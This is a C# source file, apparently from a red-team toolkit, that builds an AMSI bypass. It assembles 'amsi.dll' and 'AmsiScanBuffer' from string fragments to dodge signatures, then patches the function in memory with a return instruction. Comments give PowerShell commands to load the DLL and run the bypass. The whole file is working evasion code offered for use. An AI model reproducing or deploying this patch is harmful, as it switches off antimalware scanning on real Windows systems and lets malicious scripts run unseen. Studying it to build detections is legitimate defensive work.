/*
   
   Notes:
 
   Big thanks to _rastamouse for his original bypass here: https://github.com/rasta-mouse/AmsiScanBufferBypass
   To see more, check out my post relating to this: https://crawl3r.github.io/2020-05-22/AMSI_Resurrecting_the_dead

*/

// Usage:
// Build into a DLL, deploy and run:
// PS>  [System.Reflection.Assembly]::LoadFile("C:\\Users\\usr_gary\\Desktop\\AmsiFun.dll")
// PS>  [Amsi]::Bypass()


using System;
using System.Runtime.InteropServices;

public class Amsi
{
    static byte[] patchBytes = new byte[] { 0xC3 };

    public static void Bypass()
    {
        try
        {
            string lol = "am";
            string lol2 = "s";
            string lol3 = "i.";
            string lol4 = "d";
            string lol5 = "ll";

            string kek = "A";
            string kek2 = "ms";
            string kek3 = "iS";
            string kek4 = "can";
            string kek5 = "B";
            string kek6 = "u";
            string kek7 = "ff";
            string kek8 = "er";

            string libFull = lol + lol2 + lol3 + lol4 + lol5;
            string procFull = kek + kek2 + kek3 + kek4 + kek5 + kek6 + kek7 + kek8;

            var lib = Win32.LoadLibrary(libFull);
            var addr = Win32.GetProcAddress(lib, procFull);

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);

            Marshal.Copy(patchBytes, 0, addr, patchBytes.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}